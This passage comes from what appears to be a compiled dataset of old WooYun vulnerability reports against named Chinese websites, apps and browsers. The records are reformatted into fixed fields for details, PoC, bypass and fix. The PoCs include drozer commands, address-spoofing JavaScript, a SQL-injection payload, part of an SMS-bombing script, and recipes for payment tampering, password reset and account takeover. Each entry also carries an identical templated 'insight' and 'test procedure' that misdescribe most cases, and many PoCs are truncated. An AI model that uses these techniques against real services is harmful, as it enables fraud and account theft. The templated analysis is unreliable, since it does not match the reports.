**POC**: 1.手势密码绕过在设置了手势密码的时候，通过启动com.zrb.SplashActivity，可绕过手势密码，查看用户信息dz> run app.activity.start --component com.zrb  com.zrb.SplashActivity2.broadcast拒绝服务app暴露多个组件，其中Receiver: com.umeng.message.BootBroadcastReceiver 会引发程序奔溃退出dz> run app.broadcast.send --component com.zrb  com.umeng.message.BootBroadcastRece

**绕过**: 过滤绕过

**修复**: 修复你们比较懂
---

---
### [wooyun-2015-0157507] 亲宝宝Android客户端任意账户密码重置
**厂商**: https://example.com/[已脱敏] | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在用手机注册的时候，发现验证码是4位的，感觉有被暴力猜解的可能，于是测试一下，结果却发现验证码在发送请求的时候被直接返回了。这样，即使用一个实际不存在的手机号也可以注册，如13512345678。验证码 code:6390被直接返回了输入验证码，进到这里。提示已注册过了，可以登录或者继续注册一个（如果选择这一项，原来的内容就废了，失去了和手机号的关联）。登陆进去发现，这应该是一个测试人员的账号，囧同样的方式，换一个没被注册过的号码试试，可以注册成功。并且找回密码也是一样，可以直接根据返回的code重置密码。实际上，输入验证码后是会再次到服务器验证的。所以在请求时直接返回了验证码应该是个bug，但是影响很大。如图，在对code进行des加密后，会再次到服务器上验证。发送到服务器的数据包会进行自签名(计算值sign)，如果用burp简单的修改手机号码后就进行重发就会报500但是这个算法是可以被

**POC**: 可以随意申请账号，也可以重置任意账号密码。

**绕过**: 直接利用

**修复**: 1. 千万不要在请求手机验证码时直接把验证码通过web返回2. 最好使用6位验证码3. IOS端如果是类似逻辑需要一并修改
---

---
### [wooyun-2014-084515] 某运营商某省套餐购买逻辑漏洞+订单泄露
**厂商**: 某运营商 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 套餐购买地址：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-066355] 搜狗浏览器5.0.9.13085HTTP204伪造网站漏洞
**厂商**: 搜狗 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: <form action="https://example.com/[已脱敏]" target="xx" method="post" onsubmit="setTimeout('d()', 11);" id="c"><input type="submit">a</input></form><script>function d(){var k = window.open("java		script:document.write(4)", "xx");}</script>

**绕过**: 直接利用

**修复**: http204没有响应内容 内容修改时地址应该改为about:blank
---

---
### [wooyun-2013-040837] 某电商平台短信验证码短信轰炸
**厂商**: 江苏某电商平台电子商务有限公司 | **年份**: 2013 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 利用代码#! /usr/bin/env python#coding=utf8from  time import ctime,sleepimport urllib2import cookielibimport urllibimport sysimport threadimport threading;class ThreadMessage(threading.Thread):def __init__(self,func,args,name):super(ThreadMessage,self).__init__();self.func = funcself.args = argsself.name = namedef run(self):self.result = self.func(*self.args);def sendMessage(n,number):cookie = cookieli

**POC**: 利用代码#! /usr/bin/env python#coding=utf8from  time import ctime,sleepimport urllib2import cookielibimport urllibimport sysimport threadimport threading;class ThreadMessage(threading.Thread):def __init__(self,func,args,name):super(ThreadMessage,self).__init__();self.func = funcself.args = argsself.name

**绕过**: 直接利用

**修复**: 增加时间验证。
---

---
### [wooyun-2013-024321] SupperRadius商业系例 加密算法破解
**厂商**: 亿联S-Radiuss系列产品 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 账号保留 密码提取出来.如果密码为70da4k 其中7,0,4为数字 就到数字表中查找;d,a,k 则在字母表查找对应的代码(列表中都是2位十六进制,其实在后面再加2个0 就是 真实密码,为了清楚,在表格中省略00)【1】7在密码第一位 则查找7对应的第一位5d,然后5d后加上00  (每个字符后都要加)->也就是5d00【2】字母d在字母表对应的第三位是05,->0500一一对应这样子70da4k的真实密码也就是5D00590005000E0053000A00直接复制这个当拨号连接密码就是真实密码 登录即可

**POC**: try{this.textBox2.Text = "";char[,] chArray = new char[,] { { 'A', '9', '1', 'F', '7', '1' }, { 'B', '8', '0', 'E', '6', '0' }, { '8', 'B', '3', 'D', '5', '3' }, { '9', 'A', '2', 'C', '4', '2' }, { 'E', 'D', '5', 'B', '3', '5' }, { 'F', 'C', '4', 'A', '2', '4' }, { 'C', 'F', '7', '9', '1', '7' }, { 

**绕过**: 直接利用

**修复**: 修改加密方式(防止内存读取)
---

---
### [wooyun-2011-01188] 某分类信息网站活动手机验证码发送缺陷和物理路径泄露
**厂商**: 某分类信息网站 | **年份**: 2011 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: Notice: Undefined index: phone in /data/server/www/ganji_v3/apps/lottery/controller/LotteryCodeController.php on line 114Fatal error: Uncaught exception 'Exception' with message '1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right 

**绕过**: 直接利用

**修复**: 你知道的
---

---
### [wooyun-2014-052126] 逐浪CMS设计缺陷遍历目录(官网备份源码泄漏)
**厂商**: 逐浪CMS | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 参数注入

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: URL：https://example.com/[已脱敏] 可以跳出upload目录读取到其他目录文件。导致可以遍历目录。攻击者可以收集信息进一步攻击。

**POC**: 目录浏览，泄漏官方备份源码。

**绕过**: 直接利用

**修复**: 可以说不是漏洞把。
---

---
### [wooyun-2015-0108184] 淘美网逻辑漏洞美女某互联网公司、手机号等信息免费任意看（1分钱都不给）
**厂商**: 淘美网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 淘美网重置处存在逻辑漏洞，可绕过支付直接充值成功经过测试发现支付成功后流程走至如下链接：https://example.com/[已脱敏] 就可以绕过支付直接充值成功。新注册个账号进行测试：账号余额0：我们去充值，这个过程用burpsuite抓包，金额随意写抓到支付订单号然后构造链接：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 加强输入验证
---

---
### [wooyun-2015-0150937] 极路由某处支付漏洞可不花钱购买极三
**厂商**: 极路由 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 极路由APP内购买处未对数量参数做出限制 导致可修改为负数

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 限制参数正负去年乌云集市换的极路由1s 现在寝室2.4g频段干扰严重 正缺个支持5g的路由  求送极路由三  嘿嘿去年乌云集市换的极路由1s 现在寝室2.4g频段干扰严重 正缺个支持5g的路由  求送极路由三  嘿嘿
---

---
### [wooyun-2015-0105766] 神州租车APP客户端设计缺陷导致的一系列安全问题（算法破解/权限遍历等）
**厂商**: 神州租车 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先先列举一下安卓客户端的一些问题：1、allowBackup="true"2、代码未做混淆3、未做重打包防护4、使用AES对称加密算法，且秘钥硬编码5、调试代码过多对于第一个问题本文将不做证明，危害请看https://example.com/[已脱敏]

**POC**: 下面将一步一步讲解如何解密神州租车安卓APP客户端请求数据从而进行攻击。首先，通过burp代理app的数据，抓包如下：https://example.com/[已脱敏]

**绕过**: 编码绕过

**修复**: 本文主要是说明密码学误用造成的危害，而且客户端加密也不是解决所有安全问题的解决方案，其只是增加了攻击成本而已，服务端验证才是王道。此类问题在现在的安卓app中大量存在，值得注意。
---

---
### [wooyun-2015-0103513] 诚品快拍Android客户端最新版二维码扫描过滤不当导致可插入恶意代码+整站源码泄露
**厂商**: 诚品快拍 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 先生成一个二维码然后用诚品快拍扫一下执行了我的js弹窗代码再次扫码并抓包POST /loganal/useStat.action HTTP/1.1Accept-Encoding: gzipUser-Agent: Mozilla/5.0 (Linux; Android 4.4.4; MI 2 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/[IP已脱敏] Mobile Safari/537.36 Android:KuaiPaiQR/2.5Content-Length: 261Content-Type: application/x-www-form-urlencodedHost: qrk.kuaipai.cnProxy-Connection: closeConnection: closebarco

**POC**: 先生成一个二维码然后用诚品快拍扫一下执行了我的js弹窗代码再次扫码并抓包POST /loganal/useStat.action HTTP/1.1Accept-Encoding: gzipUser-Agent: Mozilla/5.0 (Linux; Android 4.4.4; MI 2 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/[IP已脱敏] Mobile Safari/537.36 Android:KuaiPaiQR/2.5Content-Length: 261Content-Type

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2014-080186] 国航分公司某站内部系统弱口令导致万人信息泄漏
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 用户资料大量泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 用户资料大量泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别用户资料大量泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: www.ieeyou.cnhttps://example.com/[已脱敏]  admin一数万旅客信息泄露，机票所有信息和会员信息（身份证——电话——住址——航程——航班）可用于机票诈骗二任意操作他人机票订单，退票，三可以不要钱大量买机票，并且可以出票（屌丝的福利）四短信轰炸(可以任意发送短信）

**POC**: 随便查询了下， 8w条数据， 就是8万份旅客信息（身份证，姓名， 地址什么的，航程），点订单信息可以看，见上图，还有这个可大量出真票，几千元一张，我可以不敢用，还可以退票 ，发短信， 做其它好多好多。。。

**绕过**: 直接利用

**修复**: 6位数的密码可以爆破，设置复杂点的密码，还会有这事么 ？只是进去看了下 ，啥都没做求20rank
---

---
### [wooyun-2015-0125193] E宠商城某功能逻辑缺陷可任意密码重置
**厂商**: E宠商城 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在下发短信验证码时，将下发的手机号修改为我们自己的手机号即可。

**POC**: 用新密码登陆，登陆成功：

**绕过**: 直接利用

**修复**: 修改服务器端验证逻辑
---

---
### [wooyun-2013-020538] 某电商平台旗下某站支付漏洞
**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 出问题的是这个站点 https://example.com/[已脱敏] 这里我把商品价格改成了0.1刀/件订单价格成功更改

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 关于修复 我就不班门弄斧了..求礼物 求RANK 更求马云签名!!!
---

---
### [wooyun-2014-065301] 某搜索引擎浏览器6.4.0.49133伪造任意网址漏洞
**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: URL长度大于4KB时处理出错，例如将证明文件保存为c:\a.htm并打开，点击连接后可以伪造任意网址。同时URL过长的时候，会显示“已收藏”图标，估计是处理过长url时逻辑有点小问题

**POC**: <html><div id='c' style=''> //displaynoness</div><a href="#" target="newwin" id='v' style="display:block" onclick="invokePoC();window.open('javascript:1;','newwin');">just click me</a><script>function invokePoC() {wx = open("https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 无效URL及时过滤
---

---
### [wooyun-2012-07528] 263通信某处存在严重支付漏洞
**厂商**: 263通信 | **年份**: 2012 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在注册263邮箱的时候，要求去某电商平台购买套餐，一个页面直接向某电商平台POST支付的金额，使用FIDDLER2可以截取该数据包，同时修改金额，导致漏洞产生。漏洞页面：https://example.com/[已脱敏]

**POC**: 支付页面截取到的数据修改数据，POST某电商平台支付页面流水查询某电商平台支付记录

**绕过**: 直接利用

**修复**: 使用签名检验，不直接POST支付所需金额、
---

---
### [wooyun-2014-072917] 绕过补丁再次重置墨迹天气任意邮箱密码
**厂商**: mojichina.com | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 0x0 环境介绍经过个人对墨迹天气的多次反馈与沟通，墨迹的运维大大反馈说开发哥哥们终于修复了WooYun: 墨迹天气android客户端系列2：修改任意邮箱用户密码姿势一。那我看一眼是不是真修复了。0x1 diffWooYun: 墨迹天气android客户端系列2：修改任意邮箱用户密码姿势一中找回密码的连接如下：https://example.com/[已脱敏] hex ascii{{timstamp}}：客户端发出找回密码时的时间戳，几个小时内有效,编码为hex ascii。修复后的找回密码连接如下：http:/

**POC**: 要修改B的密码，只要A邮箱用户在客户端点“忘记密码”，获取一个忘记密码连接https://example.com/[已脱敏])替换成邮箱B并用hexscii编码并且大写，即可。辗转反复，高估了墨迹程序员的补丁

**绕过**: 编码绕过

**修复**: 给你们的邮件中说的挺明白了，一句话：换不可逆的编码方式。
---

---
### [wooyun-2015-094342] 有货网存在两处安全漏洞可重置任意帐号密码（逻辑与设计缺陷）
**厂商**: YOHO!有货 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先有货网主站邮件密码取回功能似乎是自己的加密，没什么问题，但是细看他还有cn分站，这个分站存在逻辑漏洞，并且帐号机制居然与主站是通用的。取回一次密码base64解码后发现哈哈了国际惯例，前面的是时间戳，后面的就是用户邮箱了。

**POC**: 利用就简单了，取回一次密码重点看这里的时间戳，GMT+8就是中国所在时区了。但这里还是要注意网络通信以及B/S段时间不同步的延迟问题，所以我们正负10秒区域进行一次爆破。最终发现时间戳是 1422416945，果然相差4秒！！经过两个&&符号与邮箱连接，在base64编码后拼接URL。重置成功。对了，之前不是说两处漏洞么？另一处比较明显了，就是这里手机取回密码只要4位数字，爆破太简单了。。。

**绕过**: 直接利用

**修复**: 你懂我懂大家懂
---

---
### [wooyun-2014-066346] 猎豹浏览器4.7.54.8107HTTP204伪造网站漏洞
**厂商**: 某软件厂商 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: <a href="https://example.com/[已脱敏]" target="xx" onclick="setTimeout('d()', 1222);">ss</a><script>function d(){window.open("javascript:location.href='javascript:location.href=\\\'<title>aloha</title>Mmm...\\\''", "xx");}</script>

**绕过**: 直接利用

**修复**: http204时不应该修改地址栏
---

---
### [wooyun-2014-071992] AA云社区逻辑漏洞#2(支付问题)
**厂商**: aayun.com | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 不多说  支付问题

**POC**: 不多说  支付问题

**绕过**: 直接利用

**修复**: 没礼物就给20rank吧
---

---
### [wooyun-2015-0144618] 蜘蛛网APP可登陆任意人员账号/查看敏感信息
**厂商**: 万丰文化 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、首先，要把需要登陆账号的UserId截取下来，咦这不是就有妹子手机号么？2、登陆我们事先注册好的账号，点登陆的时候fiddler拦截返回请求3、修改为要登陆的UserId，点返回，速度快点，否则客户端会显示超时，登陆不上4、ok，登陆成功，咱们来看下妹子的账号，所有操作都可以呢

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 换个方式登陆吧，session什么的
---

---
### [wooyun-2015-0165193] 百森水果商城某处设计逻辑缺陷漏洞一枚
**厂商**: 百森水果商城 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 百森水果商城1元随便吃https://example.com/[已脱敏]

**POC**: RT

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0129774] 联众世界某处存在高危SQL注射
**厂商**: 联众世界 | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] /charge-center/ddzquery.do HTTP/1.1Host: pay.lianzhong.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Refe

**POC**: ---Parameter: orderId (POST)Type: boolean-based blindTitle: OR boolean-based blind - WHERE or HAVING clausePayload: projectName=ddz&page=1&orderById=&orderByType=&channel=&orderId=-5065' OR 2044=2044 AND 'vCvm' LIKE 'vCvm&startDate=2015-06-27&endDate=2015-07-27&startAmount=&endAmount=Type: AND/OR ti

**绕过**: 直接利用

**修复**: fix
---

---
### [wooyun-2013-031633] 福建网龙某手机商城存在支付漏洞
**厂商**: 福建网龙 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]  这个的问题和WooYun: 安卓网商城存在严重支付漏洞和这个一样一页是抓包改包。。安卓网应该是你们网龙的、、、

**POC**: = =~

**绕过**: 直接利用

**修复**: 你懂得额
---

---
### [wooyun-2012-016163] 开通超级某互联网公司超惠生活版出现Q币支付漏洞
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 账户体系控制不严

**元思考**: 触发信号: 功能测试

**洞察**: 账户体系控制不严防护不足，开发者信任前端输入

**测试流程**:
1. 识别账户体系控制不严相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这个漏洞必须通过一次Q币验证，通过一次Q币验证后可以为超Q刷开更长时间。这个记录是历史记录页面。如果第一次支付成功后，只需要修改month数据再刷新，那么系统自动给你开通多少个月的超Q了，不需再Q币交易验证，开通的业务马上生效，扣取Q币有延时。这个是修改month数据再刷新开通的超Q通知。这个是Q币交易记录，信息摘要还出现了乱码。这个是已经所开通的超Q业务。

**POC**: 本来是开通一个月的超Q业务，没想到修改一下链接数据，业务没经过Q币交易验证马上又开通业务。

**绕过**: 直接利用

**修复**: 完善Q币支付机制，避免页面刷新造成数据重新提交，Q币交易每笔交易一次验证
---

---
### [wooyun-2015-0147317] 有米玩游戏网站某功能逻辑缺陷
**厂商**: 有米玩 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 随意购买大额游戏金币。支付时用Burp Suite抓包，可以更改支付金额。漏洞网站：https://example.com/[已脱敏]

**POC**: 价格999更改为0.01

**绕过**: 直接利用

**修复**: 你们懂得
---

---
### [wooyun-2015-0124567] 桔色成人某处支付逻辑漏洞
**厂商**: 桔色成人 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 订单处，这次不用改桔币，不用改数量，直接空手套白狼，改优惠价格！其他优惠，参数mdz_money。fiddler拦截修改，改为优惠500块。放行，真的减少了500块。。不过fiddler放行后，无法生成某电商平台支付按钮，不知道什么原因。换了burpsuite之后可以支付。注意，此处的参数mdz_money，不可优惠过多，好像是根据物品价格按比例算的，买个799的优惠500块可以，优惠600就不行。。。买个500多的话，估计只能优惠个三四百。。无法实现0元购物。但每单都可以少个几百块。

**POC**: 如上了

**绕过**: 直接利用

**修复**: 服务器端验证逻辑需完善
---

---
### [wooyun-2011-03605] 某互联网公司DLL加载漏洞可能导致用户密码被窃取
**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 利用了Windows加载DLL的一个特点。由于输入表中只包含DLL名而没有它的路径名，因此加载程序必须在磁盘上搜索DLL文件，而不是按照指定路径加载。在Windows XP sp2以上的系统会默认开启Safe Dll Search Mode，启用了这个模式后，DLL文件的搜索顺序是：可执行程序的加载目录系统目录（即system32文件夹）16位系统目录Windows目录当前目录Path环境变量中列出的目录伪造的DLL制作好后，放到程序目录下，这样当原程序调用原函数时就会优先调用了伪造的DLL文件，进入劫持DLL的代码。该文件也提供了和系统文件一样的输出表，并最终转向真正的系统文件。Lpk.dll是系统关键文件之一，某互联网公司启动时也要加载这个文件。在平时我们使用普通的键盘记录器记录的某互联网公司密码是错误的，因为某互联网公司的密码框使用了特殊的设计，保护密码安全。但是我制作了一个假冒的lpk.dll，这个文件能

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 微软的解释请访问https://example.com/[已脱敏]).aspx(1）调用LoadLibrary，LoadLibraryEx，CreateProcess的，或者的ShellExecute等涉及到模块加载的函数的时候，指定DLL加
---

---
### [wooyun-2013-018331] 嘀咕团支付漏洞及验证码绕过
**厂商**: 嘀咕团 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注册是https://example.com/[已脱敏]

**POC**: 注册是https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 验证~~好了~~大家屯年货去吧~~
---

---
### [wooyun-2012-011951] 点我吧某站点存在严重支付漏洞
**厂商**: dianwoba.com | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.不用说了，是主站啊，看这里https://example.com/[已脱敏]

**POC**: 4.点击提交订单，抓包看下post的数据fun=addOrder&addrid=118501&qukuai=C&contact=昆汀&addrs=的顶顶顶顶顶顶顶顶顶顶&phone=13812344321&receiveTime=2012-09-11 11:15&menu_list=180010|1;180013|1;&menu_list2=意式鲜香腊肉肠披萨|1;香酥罗非鱼披萨|1;&menuPrice=118&runnerPrice=10&totalAmount=2&remarks=无&supid=180&sexvalue=1&arrivetime=2012-09-11 11:15&pa

**绕过**: 直接利用

**修复**: 1.像金额这样的信息不要放在页面上，确实有随时被篡改的风险，这些信息本来就在数据库中，可以定义一个字符型的字段代替金额的传输，或者直接由商品唯一标识来查询数据库得到金额；2.签名校验是最重要的了，将购买的商品、数量、金额（或替代字段）、订单的ID号生成一个校验字符串。在每次数据传输的过程中进行校验，
---

---
### [wooyun-2014-084135] WPS office某功能极易诱导用户过UAC执行任意代码！
**厂商**: 某软件厂商 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 从很久以前就发现，WPS有一个很令人讨厌的功能，那就是每次打开和关闭WPS时，它总会自动启动自带的wpsupdate.exe（自动更新）和wpsnotify.exe（弹窗广告），就算在WPS配置工具里关闭了自动更新功能，它还是会自动启动。测试后发现，WPS启动时并没有验证那俩程序的真实性，虽然有数字签名，但是普通用户有几个会注意到呢？所以如果构造一个同名恶意软件并替换它们，那么在windows7等系统下运行WPS时，就算触发了UAC提示，也极易诱导用户手动过UAC执行假冒的恶意程序。而且，WPS默认安装目录不受UAC保护，文件被非法替换时不会触发UAC提示。测试系统：Windows7 32位中文旗舰版，WPS office 2013个人版官方最新安装包。安装包数字签名图漏洞演示说明：运行自制的漏洞验证程序，作用是把原wpsupdate.exe替换成我仿造的wpsupdate.exe，并启动

**POC**: 演示视频下载地址https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 请认真考虑一下你们应该怎么做！
---

---
### [wooyun-2015-096380] 齐博CMS多个产品依旧存在后门
**厂商**: 齐博CMS | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 后门同WooYun: 齐博CMS整站系统最新版依然存在后门后门存在于 博客系统 下载系统 考试系统 黄页系统 新闻媒体系统 图片系统 视频系统 知道系统漏洞文件为inc/splitword.php  CRC32   ：C6B4B212文件采用威盾加密 解密后代码见：https://example.com/[已脱敏] 101行发现后门详情见漏洞证明

**POC**: 博客系统：下载系统:考试系统:黄页系统 :新闻媒体系统:图片系统:视频系统:知道系统 :以博客系统为例：

**绕过**: 直接利用

**修复**: 不知道
---

---
### [wooyun-2015-094975] 寻医问药网逻辑缺陷导致大量用户信息泄露
**厂商**: 寻医问药 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 预约时，到第二步（这里第一次预约是没有选择哪个用户的 第一次预约成功之后才能选择用户）下一步时抓包userid 可以修改   修改之后会把修改后的userid的用户信息添加到自己的病人信息

**POC**: 成功之后  我们在次预约可以发现多了些用户信息 选择之后 就能看到明文WooYun: 寻医问药某处越权访问，可取消全站预约订单取消预约可以越权没修复

**绕过**: 直接利用

**修复**: 验证uid
---

---
### [wooyun-2014-081867] 三星手机随意访问RILD接口（可以解除定制机网络制式的软限制）
**厂商**: 三星 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

